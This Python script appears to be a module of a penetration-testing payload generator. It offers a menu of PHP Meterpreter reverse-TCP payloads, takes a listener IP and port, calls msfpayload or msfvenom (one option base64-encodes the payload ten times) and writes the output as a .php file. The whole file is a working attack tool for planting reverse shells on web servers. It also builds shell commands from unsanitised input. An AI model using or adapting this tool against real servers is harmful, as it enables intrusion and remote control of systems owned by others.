#!/usr/bin/python
#
import os
import subprocess as subp
from src.core import menus
from src.core.main import *
from time import sleep

while 1:
	try:
		# select payload
		selection = 0
		while selection != range(1,4):
			clear()
			menus.php_menu()
			selection = raw_input(" %sSelection > %s" % (colours.bold, colours.reset))
			if selection == '1':
				payload = "php/meterpreter/reverse_tcp"
				break
			if selection == '2':
				payload = "php/meterpreter_reverse_tcp"
				break
			if selection == '3' or selection =='':
				payload = "php/meterpreter/reverse_tcp"
				break
		
		# get some payload info
		ip, port = connectInfo("r")
		outfile = raw_input(" Enter a name for php file: ")
		if not outfile:
			outfile = "paygen-pl"

		# remove double extension
		outfile = outfile.split(".")[0]
		outfile += ".php"
		
		# create payload
		if selection == '1' or selection == '2':
			PrintInfo("Creating payload please wait...\n")
			proc = subp.Popen("msfpayload %s lhost=%s lport=%s R" \
				% (payload, ip, port), shell=True, stdout=subp.PIPE)
			code = proc.communicate()[0]
			
		elif selection == '3' or not selection:
			PrintInfo("Creating payload with x10 base64. Please wait...\n")
			proc = subp.Popen("msfvenom -p %s lhost=%s lport=%s -e php/base64 -i 10 -f raw" \
				% (payload, ip, port), stdout=subp.PIPE, shell=True)
			code = proc.communicate()[0]

		# write payload file
		pl = "<?php\n\n" + code + "\n\n?>"
		f = open("output/"+outfile, "w")
		f.write(pl)
		f.close()
	
		# return to main
		PrintInfo("File output/%s has been created" % outfile)
		EntContinue()
		break
	except KeyboardInterrupt:
		break
